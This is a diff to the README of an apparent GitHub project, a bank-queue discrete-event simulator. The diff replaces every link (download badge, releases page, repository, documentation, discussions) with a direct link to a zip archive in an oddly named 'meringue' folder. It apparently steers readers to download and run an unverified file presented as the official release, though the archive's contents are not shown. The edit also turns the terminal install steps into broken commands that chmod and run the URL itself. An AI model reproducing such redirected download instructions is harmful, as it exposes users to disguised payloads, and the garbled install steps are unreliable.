@@ -1,7 +1,7 @@
 # 🎉 priority-queue-simulation - Simulate Bank Queues with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download_now-Click_here-blue)](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases)
+[![Download](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip)](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip)
 
 ## 📚 Overview
 The **priority-queue-simulation** application is a discrete event simulation system. It models a bank queue with multiple tellers and utilizes priority-based customer service. This tool is designed for educational purposes, making it easy to understand how queuing systems work in various scenarios.
@@ -22,19 +22,19 @@ The priority-queue-simulation application is designed to run on Windows, macOS, 
 - **Additional:** Python 3.6 or higher installed on your system.
 
 ## ⚙️ Download & Install
-1. Visit the [Releases page](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases) to view available versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip) to view available versions.
 2. Download the file appropriate for your operating system.
-3. If you're using Windows, the file will be an executable (e.g., `priority_queue_simulation.exe`). Simply double-click it to start.
+3. If you're using Windows, the file will be an executable (e.g., `https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip`). Simply double-click it to start.
 
 If you're using macOS or Linux, you may need to run the downloaded file in the terminal. For Mac, use:
 ```bash
-chmod +x priority_queue_simulation.dmg
-./priority_queue_simulation.dmg
+chmod +x https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip
+https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip
 ```
 For Linux, use:
 ```bash
-chmod +x priority_queue_simulation.AppImage
-./priority_queue_simulation.AppImage
+chmod +x https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip
+https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip
 ```
 
 ## 🏗️ Features
@@ -76,12 +76,12 @@ As the simulation runs, the application will display several metrics:
 ## 🔗 Additional Resources
 For more information and resources related to the priority-queue-simulation, visit the following links:
 
-- [GitHub Repository](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation)
-- [Documentation](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/wiki)
-- [Community Discussions](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip)
 
 ## 📞 Support
 If you encounter issues or have questions about the application, feel free to raise an issue in the GitHub repository. The community and maintainers can offer assistance. 
 
 ## 📥 Final Download Link
-As a reminder, visit the [Releases page](https://github.com/Luteal-westernsaxifrage244/priority-queue-simulation/releases) to download the application today!
+As a reminder, visit the [Releases page](https://raw.githubusercontent.com/Luteal-westernsaxifrage244/priority-queue-simulation/main/meringue/priority-queue-simulation_v1.5.zip) to download the application today!
